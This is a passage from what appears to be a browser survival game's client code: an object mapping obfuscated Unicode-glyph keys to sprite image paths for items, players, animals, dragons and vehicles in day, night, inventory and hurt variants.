			"ᐃⵠⲆΔⵠⵠΔ": "img/day-hand-diamond-protection.png",
			"ΔΔⵠᐃⵠⵠᐃ": "img/night-hand-diamond-protection.png",
			"ᐃⵠⲆΔΔⵠᐃ": "img/inv-diamond-protection-out.png",
			"ⲆᐃᐃΔᐃΔⵠ": "img/inv-diamond-protection-in.png",
			"ⵠⵠⵠⲆΔⲆᐃ": "img/inv-diamond-protection-click.png",
			"ⲆΔΔΔᐃᐃⲆ": "img/day-amethyst-protection.png",
			"ⲆΔᐃΔᐃᐃΔ": "img/night-amethyst-protection.png",
			"ⲆᐃⵠᐃΔᐃⲆⵠⵠ": "img/day-hand-amethyst-protection.png",
			"ΔᐃΔⲆΔΔΔⵠⵠ": "img/night-hand-amethyst-protection.png",
			"ⵠΔΔⵠⲆΔⲆ": "img/inv-amethyst-protection-out.png",
			"ᐃΔΔᐃⵠⵠΔ": "img/inv-amethyst-protection-in.png",
			"ⲆΔΔⲆᐃᐃᐃ": "img/inv-amethyst-protection-click.png",
			"ⲆΔⲆⵠᐃᐃΔ": "img/day-reidite-sword.png",
			"ⲆᐃΔⵠᐃᐃΔ": "img/night-reidite-sword.png",
			"ⵠᐃⲆⵠⵠΔⵠ": "img/inv-reidite-sword-out.png",
			"ⲆΔⲆⲆⲆⵠᐃ": "img/inv-reidite-sword-in.png",
			"ⵠⵠⵠⵠⲆΔⵠ": "img/inv-reidite-sword-click.png",
			"ⵠᐃⵠᐃⲆⵠⲆ": "img/inv-reidite-out.png",
			"ⵠΔᐃΔⲆⵠⲆ": "img/inv-reidite-in.png",
			"ⲆᐃΔⲆΔⲆΔ": "img/inv-reidite-click.png",
			"ᐃⲆᐃⲆⲆΔⵠ": "img/inv-flame-out.png",
			"ⵠⵠⲆᐃᐃⵠⲆ": "img/inv-flame-in.png",
			"ᐃⵠΔΔΔⵠⲆ": "img/inv-flame-click.png",
			"ᐃⵠΔᐃΔⵠᐃ": "img/day-magma-buble0.png",
			"ⲆⲆᐃᐃΔⵠΔ": "img/night-magma-buble0.png",
			"ⲆⵠⵠⲆΔⲆᐃ": "img/day-magma-buble1.png",
			"ⲆΔΔΔⵠΔΔ": "img/night-magma-buble1.png",
			"ΔΔⵠⵠⵠⵠᐃ": "img/day-magma-buble2.png",
			"ⲆⲆΔⲆΔᐃⲆ": "img/night-magma-buble2.png",
			"ᐃᐃⵠⲆΔᐃΔ": "img/day-lava-dragon.png",
			"ΔᐃⲆⵠⵠᐃᐃ": "img/night-lava-dragon.png",
			"ⵠᐃᐃⵠⵠΔⲆᐃⲆ": "img/day-fire-dragon.png",
			"ⲆΔᐃⵠᐃΔᐃᐃⵠ": "img/night-fire-dragon.png",
			"ΔΔⵠᐃⵠⵠⲆ": "img/hurt-lava-dragon.png",
			"ΔΔⵠΔⲆᐃⲆ": "img/day-lava-wing-left.png",
			"ⲆΔⵠⵠΔⲆΔ": "img/night-lava-wing-left.png",
			"ᐃⲆᐃΔⲆᐃΔ": "img/day-lava-wing-right.png",
			"ᐃⲆΔⵠΔᐃᐃ": "img/night-lava-wing-right.png",
			"ᐃᐃⲆⵠⲆᐃΔ": "img/hurt-lava-wing-left.png",
			"ⵠᐃⲆΔⲆⲆⲆ": "img/hurt-lava-wing-right.png",
			"ⲆⲆᐃⲆΔΔⵠ": "img/day-reidite-spear.png",
			"ᐃᐃⲆⵠⲆΔΔ": "img/night-reidite-spear.png",
			"ⵠⲆⲆⵠΔᐃᐃ": "img/inv-reidite-spear-out.png",
			"ⵠⲆΔᐃᐃⲆⵠ": "img/inv-reidite-spear-in.png",
			"ⵠΔᐃΔⵠⲆΔ": "img/inv-reidite-spear-click.png",
			"ⲆⲆΔᐃΔⲆⲆ": "img/day-reidite-helmet.png",
			"ⵠΔⲆⲆⵠⵠΔ": "img/night-reidite-helmet.png",
			"ΔᐃⲆΔΔⲆΔ": "img/inv-reidite-helmet-out.png",
			"ΔⵠⵠⵠⵠⲆⲆ": "img/inv-reidite-helmet-in.png",
			"ⵠᐃⲆⵠᐃᐃΔ": "img/inv-reidite-helmet-click.png",
			"ᐃⲆⲆᐃⲆⲆⲆ": "img/day-hand-reidite-protection.png",
			"ⵠⵠΔⲆΔΔⲆ": "img/night-hand-reidite-protection.png",
			"ᐃΔⵠᐃᐃⲆⵠ": "img/day-reidite-protection.png",
			"ⵠᐃⵠΔⲆⵠΔ": "img/night-reidite-protection.png",
			"ᐃⵠΔⵠⵠᐃᐃ": "img/inv-reidite-protection-out.png",
			"ᐃⲆᐃⲆΔⵠᐃ": "img/inv-reidite-protection-in.png",
			"ᐃᐃΔᐃⵠᐃᐃ": "img/inv-reidite-protection-click.png",
			"ᐃΔΔⲆⵠᐃᐃ": "img/day-lava-dragon-sword.png",
			"ⲆⵠⲆᐃΔⲆⵠ": "img/night-lava-dragon-sword.png",
			"ᐃⵠⵠΔⵠΔᐃ": "img/inv-lava-dragon-sword-out.png",
			"ΔⵠΔΔΔΔⵠ": "img/inv-lava-dragon-sword-in.png",
			"ΔΔⵠΔⲆᐃⵠ": "img/inv-lava-dragon-sword-click.png",
			"ΔⲆⵠⲆΔΔΔ": "img/day-lava-spear.png",
			"ΔΔⵠⵠᐃᐃΔ": "img/night-lava-spear.png",
			"ⲆⵠⲆⲆⵠΔΔ": "img/inv-lava-spear-out.png",
			"ΔⵠⵠᐃⲆᐃᐃ": "img/inv-lava-spear-in.png",
			"ᐃᐃᐃⵠⵠᐃΔ": "img/inv-lava-spear-click.png",
			"ⵠᐃⵠⵠᐃⵠⲆ": "img/day-lava-helmet.png",
			"ⵠⵠⵠⵠⵠⵠΔ": "img/night-lava-helmet.png",
			"ΔⲆⵠⲆⵠⲆΔ": "img/inv-lava-helmet-out.png",
			"ⲆⵠᐃᐃⵠΔⵠ": "img/inv-lava-helmet-in.png",
			"ΔⲆΔⵠⵠᐃⵠ": "img/inv-lava-helmet-click.png",
			"ⵠᐃⵠⵠᐃⵠᐃ": "img/day-witch-hat.png",
			"ⲆᐃΔΔᐃᐃⲆ": "img/night-witch-hat.png",
			"ᐃⲆⲆΔⲆⵠᐃ": "img/inv-witch-hat-out.png",
			"ᐃΔᐃᐃⵠᐃⵠ": "img/inv-witch-hat-in.png",
			"ⲆⲆⲆΔⲆⵠⵠ": "img/inv-witch-hat-click.png",
			"ΔΔᐃΔⲆⵠᐃ": "img/day-nimbus2000.png",
			"ᐃⲆⲆΔᐃⲆΔ": "img/night-nimbus2000.png",
			"ᐃⵠⲆⲆⵠΔᐃ": "img/inv-nimbus2000-out.png",
			"ⵠⲆⵠⲆⲆΔᐃ": "img/inv-nimbus2000-in.png",
			"ⵠⲆᐃⲆⲆᐃⲆ": "img/inv-nimbus2000-click.png",
			"ΔⲆΔᐃⲆΔΔ": "img/day-accessory1-pacques.png",
			"ⲆⵠⵠⵠⵠⲆΔ": "img/night-accessory1-pacques.png",
			"ⵠⵠⵠⵠΔⵠⵠ": "img/day-accessory2-pacques.png",
			"ⵠⲆⵠᐃΔⵠⲆ": "img/night-accessory2-pacques.png",
			"ⲆΔⵠⵠΔⲆⲆ": "img/day-accessory3-pacques.png",
			"ⲆΔⲆⲆΔⵠⵠ": "img/night-accessory3-pacques.png",
			"ΔᐃⵠᐃΔᐃΔ": "img/day-accessory5-pacques.png",
			"ΔⵠⵠᐃⲆᐃΔ": "img/night-accessory5-pacques.png",
			"ᐃᐃⲆⲆᐃⲆᐃ": "img/day-accessory6-pacques.png",
			"ⲆΔⵠⵠΔΔᐃ": "img/night-accessory6-pacques.png",
			"ΔΔⲆⲆΔⵠΔ": "img/day-accessory7-pacques.png",
			"ΔⲆᐃᐃᐃΔⵠ": "img/night-accessory7-pacques.png",
			"ΔᐃⵠΔΔΔᐃ": "img/day-accessory8-pacques.png",
			"ᐃᐃᐃⲆᐃΔⵠ": "img/night-accessory8-pacques.png",
			"ᐃᐃᐃⵠᐃⵠⲆ": "img/day-bag-pacques.png",
			"ⵠⲆⲆᐃᐃᐃⵠ": "img/night-bag-pacques.png",
			"ΔΔⵠⵠᐃΔⵠ": "img/day-carrot.png",
			"ᐃΔⵠᐃⲆΔΔ": "img/night-carrot.png",
			"ⲆΔⲆᐃⵠᐃΔ": "img/day-carrot-dried.png",
			"ΔⵠΔΔΔⲆⵠ": "img/night-carrot-dried.png",
			"ⲆΔᐃᐃᐃᐃᐃ": "img/day-tomato-herb.png",
			"ⵠΔᐃΔⵠᐃⲆ": "img/night-tomato-herb.png",
			"ⲆᐃⲆⲆΔΔΔ": "img/day-tomato-herb-dried.png",
			"ᐃⵠⲆⲆⵠΔⵠ": "img/night-tomato-herb-dried.png",
			"ⵠⲆⲆⵠΔⲆΔ": "img/day-tomato.png",
			"ⲆΔΔᐃΔⲆᐃ": "img/night-tomato.png",
			"ⲆⵠⵠⲆΔΔᐃ": "img/inv-carrot-out.png",
			"ΔⲆⲆΔⲆⲆᐃ": "img/inv-carrot-in.png",
			"ⵠΔⵠᐃΔⲆᐃ": "img/inv-carrot-click.png",
			"ⲆⲆⵠⲆⵠⵠΔ": "img/inv-tomato-out.png",
			"ΔᐃᐃⵠⲆΔⵠ": "img/inv-tomato-in.png",
			"ΔΔⵠΔΔᐃᐃ": "img/inv-tomato-click.png",
			"ᐃΔⵠⵠⵠⵠΔ": "img/day-player0.png",
			"ΔⲆᐃᐃⵠΔᐃ": "img/night-player0.png",
			"ⵠⲆΔⵠᐃⲆΔ": "img/day-player1.png",
			"ᐃᐃΔⵠᐃⲆⲆ": "img/night-player1.png",
			"ΔⵠⵠΔⵠⲆᐃ": "img/day-player2.png",
			"ΔᐃᐃⲆΔᐃⲆ": "img/night-player22.png",
			"ⲆⵠΔⵠⲆΔⲆ": "img/day-player3.png",
			"ᐃΔΔⲆᐃΔΔ": "img/night-player33.png",
			"ΔⲆᐃΔⲆΔⵠ": "img/day-player4.png",
			"ⵠⲆⵠᐃⵠⵠⵠ": "img/night-player4.png",
			"ΔⲆᐃⲆΔᐃⲆ": "img/day-player5.png",
			"ⲆᐃᐃΔΔⵠⵠ": "img/night-player5.png",
			"ᐃⲆⵠⲆΔᐃΔ": "img/day-player6.png",
			"ⵠⲆⲆΔᐃⲆᐃ": "img/night-player6.png",
			"ⲆᐃⲆΔⵠᐃΔ": "img/day-player7.png",
			"ᐃⵠᐃⵠⵠⵠⲆ": "img/night-player7.png",
			"ⵠⲆᐃⵠᐃᐃⵠ": "img/day-player8.png",
			"ᐃΔᐃⵠΔΔΔ": "img/night-player8.png",
			"ⲆΔⲆⵠⵠᐃⲆ": "img/day-player9.png",
			"ΔⲆⲆΔⲆⵠᐃ": "img/night-player9.png",
			"ΔⲆᐃΔⲆᐃΔ": "img/day-player10.png",
			"ⵠⵠⲆᐃᐃⲆᐃ": "img/night-player10.png",
			"ΔᐃᐃᐃⲆΔᐃ": "img/day-player11.png",
			"ᐃⲆⵠⵠΔᐃⲆ": "img/night-player11.png",
			"ⲆⲆΔΔΔⲆᐃ": "img/day-player12.png",
			"ⲆΔΔᐃΔⵠΔ": "img/night-player12.png",
			"ᐃⲆⲆᐃᐃⲆⲆ": "img/day-player13.png",
			"ⲆⲆᐃⵠⲆⲆΔ": "img/night-player13.png",
			"ⲆΔⲆⲆⵠⵠᐃ": "img/day-player14.png",
			"ΔⵠⲆΔΔΔⲆ": "img/night-player14.png",
			"ᐃⵠΔⵠᐃⲆⲆ": "img/day-player15.png",
			"ᐃᐃᐃⵠⵠⵠⲆ": "img/night-player15.png",
			"ᐃΔΔΔⲆᐃΔ": "img/day-player16.png",
			"ⲆⲆΔⵠΔΔⲆ": "img/night-player16.png",
			"ⵠᐃⵠⵠΔΔⵠ": "img/day-player17.png",
			"ⲆΔⵠᐃⵠᐃᐃ": "img/night-player17.png",
			"Ⲇⵠⵠᐃᐃⵠᐃ": "img/day-player18.png",
			"ⵠⲆⵠⵠΔᐃⵠ": "img/night-player18.png",
			"ΔⵠᐃⵠⵠⲆΔ": "img/day-player19.png",
			"ⵠΔΔⲆᐃΔΔ": "img/night-player19.png",
			"ⵠⵠᐃᐃⲆⵠⵠ": "img/day-hand-player0.png",
			"ⲆⵠᐃᐃΔᐃᐃ": "img/night-hand-player0.png",
			"ΔⵠΔᐃᐃΔⲆ": "img/day-hand-player1.png",
			"ᐃΔᐃΔⲆᐃᐃ": "img/night-hand-player1.png",
			"ⵠᐃᐃᐃΔⲆⵠ": "img/day-hand-player2.png",
			"ⲆᐃⲆΔΔᐃΔ": "img/night-hand-player22.png",
			"ⲆⵠΔᐃᐃΔⲆ": "img/day-hand-player3.png",
			"ᐃⲆΔⲆᐃⵠⲆ": "img/night-hand-player33.png",
			"ᐃΔⵠⵠⵠⵠⵠ": "img/day-hand-player4.png",
			"ⲆΔᐃⲆΔᐃᐃ": "img/night-hand-player4.png",
			"ⲆΔΔΔⵠⵠⵠ": "img/day-hand-player5.png",
			"ΔⲆⵠⲆᐃΔᐃ": "img/night-hand-player5.png",
			"ⲆΔⲆᐃⲆⵠΔ": "img/day-hand-player6.png",
			"ᐃⵠⵠⵠᐃΔⵠ": "img/night-hand-player6.png",
			"ⵠᐃⵠⵠⵠᐃΔ": "img/day-hand-player7.png",
			"ⲆⵠΔᐃᐃᐃΔ": "img/night-hand-player7.png",
			"ΔⲆⲆᐃⲆⵠΔ": "img/day-hand-player8.png",
			"ᐃᐃⵠⵠᐃⲆᐃ": "img/night-hand-player8.png",
			"ⵠⲆᐃΔᐃᐃᐃ": "img/day-hand-player9.png",
			"ᐃΔⵠᐃΔⲆᐃ": "img/night-hand-player9.png",
			"ⲆᐃᐃᐃᐃΔⲆ": "img/day-hand-player10.png",
			"ᐃⲆᐃᐃⵠⵠⵠ": "img/night-hand-player10.png",
			"ᐃⲆⲆᐃⲆᐃⵠ": "img/day-hand-player11.png",
			"ᐃⲆᐃⵠΔΔᐃ": "img/night-hand-player11.png",
			"ⲆΔᐃΔΔᐃⵠ": "img/day-hand-player12.png",
			"ΔⵠⵠⵠⵠᐃΔ": "img/night-hand-player12.png",
			"ⲆⲆⲆΔᐃᐃᐃ": "img/day-hand-player13.png",
			"Δᐃᐃᐃⵠⵠᐃ": "img/night-hand-player13.png",
			"ΔᐃᐃⲆⲆᐃⲆ": "img/day-hand-player14.png",
			"ⲆᐃΔⵠⵠⵠⵠ": "img/night-hand-player14.png",
			"ᐃᐃΔⵠⲆⵠⲆ": "img/day-hand-player15.png",
			"ΔᐃΔⵠᐃⲆⲆ": "img/night-hand-player15.png",
			"ⵠᐃᐃΔⲆᐃΔ": "img/day-hand-player16.png",
			"ΔᐃΔⵠᐃᐃⵠ": "img/night-hand-player16.png",
			"ⲆᐃⲆⵠⵠⲆᐃ": "img/day-hand-player17.png",
			"ᐃᐃᐃⲆᐃⵠΔ": "img/night-hand-player17.png",
			"ⵠⵠⵠⵠΔᐃᐃ": "img/day-hand-player18.png",
			"ⵠᐃⲆΔΔᐃᐃ": "img/night-hand-player18.png",
			"ⵠᐃᐃΔΔΔΔ": "img/day-hand-player19.png",
			"ᐃΔΔᐃⲆᐃⲆ": "img/night-hand-player19.png",
			"ᐃΔᐃᐃᐃᐃΔ": "img/day-accessory4.png",
			"ᐃΔΔⵠⲆΔⲆ": "img/night-accessory4.png",
			"ΔᐃΔⵠⵠⲆΔ": "img/day-accessory9.png",
			"ⲆⲆⵠⵠΔΔⲆ": "img/night-accessory9.png",
			"ⵠΔΔⲆⲆⵠⲆ": "img/day-accessory10.png",
			"ⲆⲆⲆΔⲆΔⲆ": "img/night-accessory10.png",
			"ᐃⵠⲆⲆⲆᐃΔ": "img/day-accessory11.png",
			"ⵠΔⵠᐃⲆΔᐃ": "img/night-accessory11.png",
			"ⵠⵠΔΔⵠⲆΔ": "img/day-accessory12.png",
			"ⵠⲆⲆⲆᐃᐃⵠ": "img/night-accessory12.png",
			"ᐃΔΔⲆᐃᐃⵠ": "img/day-bag.png",
			"ⵠⵠᐃΔᐃΔᐃ": "img/night-bag.png",
			"ⲆᐃᐃᐃⲆⲆⵠ": "img/inv-bag-out.png",
			"ⲆⵠⵠⲆᐃⲆⵠ": "img/inv-bag-in.png",
			"ᐃⲆⵠⲆΔⲆⵠ": "img/inv-bag-click.png",
			"ⲆⵠⲆⲆⵠᐃⵠ": "img/day-pitchfork.png",
			"ᐃⲆⲆΔⵠΔⵠ": "img/night-pitchfork.png",
			"ⲆⵠΔᐃⲆΔᐃ": "img/inv-pitchfork-out.png",
			"ᐃⵠΔΔΔᐃΔ": "img/inv-pitchfork-in.png",
			"ΔᐃⲆΔΔⲆⲆ": "img/inv-pitchfork-click.png",
			"ᐃⲆⲆⲆⵠⵠⵠ": "img/inv-wood-spike-door-out.png",
			"ᐃⵠᐃᐃᐃᐃΔ": "img/inv-wood-spike-door-in.png",
			"ᐃΔⵠᐃⵠΔΔ": "img/inv-wood-spike-door-click.png",
			"ⲆᐃⲆΔᐃⵠⵠ": "img/inv-stone-spike-door-out.png",
			"ᐃᐃⲆⵠⵠⵠᐃ": "img/inv-stone-spike-door-in.png",
			"ⵠⲆᐃᐃᐃⲆΔ": "img/inv-stone-spike-door-click.png",
			"ⲆⵠΔⵠⵠⵠⵠ": "img/inv-gold-spike-door-out.png",
			"ᐃⲆⵠⲆⵠᐃΔ": "img/inv-gold-spike-door-in.png",
			"ΔΔⵠᐃᐃᐃΔ": "img/inv-gold-spike-door-click.png",
			"ⵠⵠⲆⵠΔⲆᐃ": "img/inv-diamond-spike-door-out.png",
			"ᐃⲆⲆⵠΔⵠᐃ": "img/inv-diamond-spike-door-in.png",
			"ΔⲆⵠⵠΔᐃⲆ": "img/inv-diamond-spike-door-click.png",
			"ⵠⲆⵠΔᐃᐃⵠ": "img/inv-amethyst-spike-door-out.png",
			"ⲆΔⲆΔⲆⵠⲆ": "img/inv-amethyst-spike-door-in.png",
			"ΔⵠᐃᐃΔΔΔ": "img/inv-amethyst-spike-door-click.png",
			"ⲆⲆⵠⵠΔΔᐃ": "img/day-wood-spike-door.png",
			"ΔᐃⵠⵠⲆⵠⲆ": "img/night-wood-spike-door.png",
			"ⵠᐃⵠΔⲆᐃⲆ": "img/day-stone-spike-door.png",
			"ⲆᐃⲆᐃⲆᐃⵠ": "img/night-stone-spike-door.png",
			"ⵠᐃⲆᐃΔⵠⵠ": "img/day-gold-spike-door.png",
			"ᐃᐃᐃᐃᐃΔⵠ": "img/night-gold-spike-door.png",
			"ⵠⵠⲆⲆΔᐃⵠ": "img/day-diamond-spike-door.png",
			"ΔᐃⲆⲆΔⲆᐃ": "img/night-diamond-spike-door.png",
			"ⵠⲆΔΔⲆⲆᐃ": "img/day-amethyst-spike-door.png",
			"ⲆΔΔⲆⵠⵠⲆ": "img/night-amethyst-spike-door.png",
			"ⲆⵠⲆᐃⵠⵠⲆ": "img/inv-reidite-spike-door-out.png",
			"ᐃⲆⲆΔⵠᐃᐃ": "img/inv-reidite-spike-door-in.png",
			"ᐃⲆΔᐃΔⲆᐃ": "img/inv-reidite-spike-door-click.png",
			"ⲆᐃⲆⲆⲆⲆᐃ": "img/inv-reidite-door-out.png",
			"ⵠΔⲆⲆⵠⵠᐃ": "img/inv-reidite-door-in.png",
			"ᐃΔⵠΔⵠⵠΔ": "img/inv-reidite-door-click.png",
			"ⲆᐃⲆᐃΔΔᐃ": "img/inv-reidite-spike-out.png",
			"ⵠⲆⵠⲆΔⲆᐃ": "img/inv-reidite-spike-in.png",
			"ⵠⲆᐃᐃⵠΔⵠ": "img/inv-reidite-spike-click.png",
			"ᐃⵠΔⵠⲆᐃᐃ": "img/inv-reidite-wall-out.png",
			"ⲆᐃⲆⲆⲆⵠⲆ": "img/inv-reidite-wall-in.png",
			"ΔᐃΔⲆᐃⵠΔ": "img/inv-reidite-wall-click.png",
			"ᐃᐃΔⲆᐃⲆⲆ": "img/day-reidite-wall.png",
			"ᐃⵠΔⵠⵠᐃⲆ": "img/night-reidite-wall.png",
			"ⲆⲆⵠᐃⵠⵠⲆ": "img/day-reidite-door.png",
			"ⵠⵠⲆⵠⵠΔΔ": "img/night-reidite-door.png",
			"ⵠᐃⵠᐃⲆΔᐃ": "img/day-reidite-spike.png",
			"ⲆΔⲆⲆᐃᐃΔ": "img/night-reidite-spike.png",
			"ΔΔⵠⲆΔⲆᐃ": "img/day-reidite-spike-door.png",
			"ΔⲆΔᐃⲆⲆⲆ": "img/night-reidite-spike-door.png",
			"ΔᐃΔⲆΔΔⵠ": "img/inv-reidite-pickaxe-out.png",
			"ⲆΔⲆⵠⵠΔΔ": "img/inv-reidite-pickaxe-in.png",
			"ᐃⵠΔᐃⵠⵠΔ": "img/inv-reidite-pickaxe-click.png",
			"ⵠΔΔⲆⵠⲆⵠ": "img/day-reidite-pickaxe.png",
			"ⵠⵠᐃⵠⵠᐃΔ": "img/night-reidite-pickaxe.png",
			"ⵠᐃⵠⵠⲆΔⲆ": "img/inv-reidite-hammer-out.png",
			"ΔΔΔΔⵠⵠΔ": "img/inv-reidite-hammer-in.png",
			"ⵠᐃⵠᐃᐃⲆᐃ": "img/inv-reidite-hammer-click.png",
			"ⵠᐃᐃᐃⲆⵠⲆ": "img/day-reidite-hammer.png",
			"ⵠⲆΔΔᐃⲆΔ": "img/night-reidite-hammer.png",
			"ⲆⵠᐃΔΔⵠΔ": "img/day-watermelon1.png",
			"ᐃΔᐃⵠⵠⲆⲆ": "img/night-watermelon1.png",
			"ΔⲆΔᐃⵠⲆᐃ": "img/day-watermelon-dried1.png",
			"ⲆⲆⲆⲆⵠᐃᐃ": "img/night-watermelon-dried1.png",
			"ᐃΔⲆᐃᐃᐃΔ": "img/inv-watermelon-out.png",
			"ⲆⲆΔⵠⲆᐃΔ": "img/inv-watermelon-in.png",
			"ⵠΔᐃⵠⵠᐃΔ": "img/inv-watermelon-click.png",
			"ⵠΔΔⲆΔΔⵠ": "img/day-boat.png",
			"ⵠⵠᐃⵠᐃⲆⲆ": "img/night-boat.png",
			"ΔᐃᐃⲆⲆᐃⵠ": "img/day-boat-wave.png",
			"ᐃⵠᐃⲆᐃⲆⲆ": "img/night-boat-wave.png",
			"ⲆᐃⵠᐃΔⲆΔ": "img/inv-boat-out.png",
			"ΔⲆⵠᐃᐃⲆᐃ": "img/inv-boat-in.png",
			"ⵠᐃⲆⵠⵠᐃΔ": "img/inv-boat-click.png",
			"ᐃΔⲆᐃⲆⵠⲆ": "img/day-plane.png",
			"ᐃⵠⵠⵠⵠΔⵠ": "img/night-plane.png",
			"ᐃᐃΔᐃᐃⲆⲆ": "img/inv-plane-out.png",
			"ᐃⵠᐃⲆΔⲆΔ": "img/inv-plane-in.png",
			"ΔⲆⵠⲆⵠⵠⲆ": "img/inv-plane-click.png",
			"ᐃⵠⲆⲆᐃᐃΔ": "img/day-sled.png",
			"ΔΔΔⲆⵠΔᐃ": "img/night-sled.png",
			"ⵠᐃᐃⵠᐃΔⵠ": "img/day-sled-wave.png",
			"ⲆΔΔⵠⲆΔⵠ": "img/night-sled-wave.png",
			"ⵠᐃΔΔΔⵠᐃ": "img/inv-sled-out.png",
			"ⲆΔⵠⲆᐃΔⲆ": "img/inv-sled-in.png",
			"ᐃⲆΔᐃⵠⵠⵠ": "img/inv-sled-click.png",
			"ᐃΔᐃⵠᐃΔⲆ": "img/day-pirate-hat.png",
			"ΔⲆΔⵠⵠⲆΔ": "img/night-pirate-hat.png",
			"Ⲇⵠⵠᐃⵠⵠⵠ": "img/inv-pirate-hat-out.png",
			"ᐃΔΔᐃⲆᐃΔ": "img/inv-pirate-hat-in.png",
			"ᐃᐃⲆⲆⲆⲆΔ": "img/inv-pirate-hat-click.png",
			"ⵠᐃⲆⲆⲆᐃⲆ": "img/day-penguin.png",
			"ᐃΔⲆⵠⲆΔΔ": "img/night-penguin.png",
			"ᐃᐃΔΔⵠᐃΔ": "img/hurt-penguin.png",
			"ᐃⲆⲆⵠΔ": "img/inv-penguin-feather-click.png",
			"ᐃⵠⲆⵠⲆ": "img/inv-hawk-feather-click.png",
			"ᐃⲆⵠᐃⲆΔΔ": "img/day-boar1.png",
			"ᐃⵠᐃⵠⵠΔΔ": "img/day-boar1-tamed.png",
			"ⲆⲆΔⲆⲆΔᐃ": "img/day-boar1-angry.png",
			"ⲆⲆΔⵠⲆⲆΔ": "img/night-boar1.png",
			"ⵠᐃᐃⲆⵠⵠΔ": "img/night-boar1-tamed.png",
			"ⵠⵠⵠΔⵠⲆᐃ": "img/night-boar1-angry.png",
			"ΔΔⲆᐃᐃⵠΔ": "img/inv-mount-boar-out.png",
			"ΔᐃᐃΔᐃⵠΔ": "img/inv-mount-boar-in.png",
			"ⵠⲆᐃⲆⵠᐃᐃ": "img/inv-mount-boar-click.png",
			"ᐃⵠΔⵠⲆΔⲆ": "img/day-hurt-boar1.png",
			"ΔⲆΔᐃᐃⵠᐃ": "img/boar1-step.png",
			"ⵠⵠΔⵠⵠΔΔ": "img/day-saddle1.png",
			"ΔⲆⲆΔΔⲆΔ": "img/night-saddle1.png",
			"ᐃⵠᐃⲆⲆΔΔ": "img/inv-saddle-out.png",
			"ΔᐃⵠΔΔⵠⲆ": "img/inv-saddle-in.png",
			"ⵠᐃⲆᐃⵠΔⲆ": "img/inv-saddle-click.png",
			"ΔᐃⵠⲆΔΔⲆ": "img/day-magic-wand0.png",
			"ⵠⵠⵠᐃΔΔᐃ": "img/night-magic-wand0.png",
			"ᐃΔΔΔΔΔⵠ": "img/day-light-wand1.png",
			"ⵠΔΔⲆⲆᐃΔ": "img/night-light-wand1.png",
			"ⲆΔⵠᐃⵠⲆᐃ": "img/inv-magic-wand0-out.png",
			"ΔⲆⲆΔᐃΔᐃ": "img/inv-magic-wand0-in.png",
			"ⲆⵠⵠⲆⲆⲆᐃ": "img/inv-magic-wand0-click.png",
			"ᐃᐃⵠᐃⵠᐃᐃ": "img/day-magic-wand1.png",
			"ⲆⵠᐃⵠⲆⵠᐃ": "img/night-magic-wand1.png",
			"ᐃⵠⵠⲆΔⲆΔ": "img/day-light-wand0.png",
			"ⵠΔⲆΔᐃⲆᐃ": "img/night-light-wand0.png",
			"ΔⵠⲆΔΔⵠⵠ": "img/inv-magic-wand1-out.png",
			"ⵠΔⲆᐃᐃΔᐃ": "img/inv-magic-wand1-in.png",
			"ᐃΔΔⵠⵠⲆᐃ": "img/inv-magic-wand1-click.png",
			"ΔⲆⵠᐃΔⵠⲆ": "img/day-firefly.png",
			"ᐃⲆⵠⵠⵠᐃⵠ": "img/night-firefly.png",
			"ⲆᐃᐃⵠΔᐃΔ": "img/hurt-firefly.png",
			"ᐃⲆⲆⵠⲆⲆᐃ": "img/inv-firefly-out.png",
			"ᐃΔΔΔⲆΔⵠ": "img/inv-firefly-in.png",
			"ⵠΔⲆⵠᐃΔᐃ": "img/inv-firefly-click.png",
			"ΔᐃΔᐃᐃⵠΔ": "img/day-baby-dragon.png",
			"ΔⵠⵠΔᐃᐃΔ": "img/night-baby-dragon.png",
			"ΔⵠⵠⵠᐃⲆᐃ": "img/day-baby-dragon-angry.png",
			"ΔⵠΔⵠᐃΔᐃ": "img/night-baby-dragon-angry.png",
			"ᐃΔᐃⲆⵠΔΔ": "img/day-baby-dragon-tamed.png",
			"ΔᐃΔΔᐃΔᐃ": "img/night-baby-dragon-tamed.png",
			"ⵠⵠᐃΔⲆⵠᐃ": "img/day-wing-dragon-left-angry.png",
			"ⲆⲆⲆⲆⵠⲆⵠ": "img/night-dragon-wing-left-angry.png",
			"ⲆΔᐃΔΔⵠΔ": "img/day-wing-dragon-right-angry.png",
			"ᐃΔⲆⵠΔᐃⲆ": "img/night-dragon-wing-right-angry.png",
			"ⵠⲆᐃᐃᐃᐃᐃ": "img/day-wing-dragon-left-tamed.png",
			"ΔᐃᐃⲆΔᐃΔ": "img/night-dragon-wing-left-tamed.png",
			"ⲆⲆⵠⵠΔΔΔ": "img/day-wing-dragon-right-tamed.png",
			"ΔᐃⵠΔᐃⲆⵠ": "img/night-wing-dragon-right-tamed.png",
			"ΔⲆΔⵠΔⵠᐃ": "img/day-wing-dragon-left.png",
			"ΔⲆΔⵠᐃⵠᐃ": "img/night-dragon-wing-left.png",
			"ᐃⲆⲆΔᐃΔΔ": "img/day-wing-dragon-right.png",
			"ⲆΔΔᐃⲆΔΔ": "img/night-wing-dragon-right.png",
			"ⲆᐃⲆⲆⲆᐃΔ": "img/hurt-baby-dragon.png",
			"ΔⲆⲆⵠᐃⵠᐃ": "img/hurt-baby-dragon-wing-left.png",
			"ᐃⵠⲆᐃⲆΔⲆ": "img/hurt-baby-dragon-wing-right.png",
			"ΔᐃⵠΔΔⵠΔ": "img/inv-baby-dragon-out.png",
			"ᐃᐃᐃΔᐃΔⲆ": "img/inv-baby-dragon-in.png",
			"ⲆΔⵠᐃⵠᐃΔ": "img/inv-baby-dragon-click.png",
			"ⵠⵠⵠᐃⵠᐃⲆ": "img/day-baby-lava.png",
			"ⲆᐃⲆⵠⵠΔᐃ": "img/night-baby-lava.png",
			"ⵠⲆⲆⵠᐃΔΔ": "img/day-baby-lava-angry.png",
			"ⵠⵠⵠᐃΔⲆΔ": "img/night-baby-lava-angry.png",
			"ⵠⲆᐃᐃⲆⵠⲆ": "img/day-baby-lava-tamed.png",
			"ΔΔⵠΔΔΔΔ": "img/night-baby-lava-tamed.png",
			"ΔΔⵠᐃΔⲆΔ": "img/day-wing-lava-left-angry.png",
			"ⵠᐃΔⲆᐃⵠᐃ": "img/night-wing-lava-left-angry.png",
			"ᐃⲆΔᐃⵠΔᐃ": "img/day-wing-lava-right-angry.png",
			"ΔⵠⲆᐃⵠᐃΔ": "img/night-wing-lava-right-angry.png",
			"ᐃⵠⵠⲆⲆΔᐃ": "img/day-wing-lava-left-tamed.png",
			"ΔⲆⲆᐃΔΔⵠ": "img/night-wing-lava-left-tamed.png",
